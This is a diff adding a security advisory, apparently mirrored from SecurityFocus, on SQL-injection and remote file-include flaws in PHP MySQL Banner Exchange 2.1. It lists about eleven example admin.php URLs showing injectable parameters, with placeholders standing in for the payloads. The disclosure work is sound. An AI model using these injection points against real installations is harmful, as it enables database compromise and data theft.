@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/19240/info
+ 
+PHP MySQL Banner Exchange is prone to multiple SQL-injection vulnerabilities and a remote file-include vulnerability because it fails to properly sanitize user-supplied input. 
+ 
+An attacker can exploit the SQL-injection vulnerabilities to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.
+ 
+An attacker may also leverage the remote file-include issue to include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process.
+ 
+Version 2.1 of the application is affected by these vulnerabilities; other versions may also be affected.
+
+http://www.example.com/admin.php?activatebanner&id=-1%20[SQLi] 
+http://www.example.com/admin.php?activateuser&id='+[SQL] 
+http://www.example.com/admin.php?deleteunuser&id='+[SQL] 
+http://www.example.com/admin.php?deleteuserbanner&deleteuserbanner='+[SQL] 
+http://www.example.com/admin.php?deleteuserbanner&deleteuserbanner='+[SQL] 
+http://www.example.com/admin.php?viewmem&viewmem='+[SQL] 
+http://www.example.com/admin.php?viewmemunb&viewmemunb='+[SQL] 
+http://www.example.com/admin.php?viewunmem&viewunmem='+[SQL] 
+http://www.example.com/admin.php?deletebanner&id=-1+[SQL] 
+http://www.example.com/admin.php?activateuser&deleteuser='+[SQL] 
+http://www.example.com/admin.php?deleteuserbanner&deleteuserbanner='+[SQL]
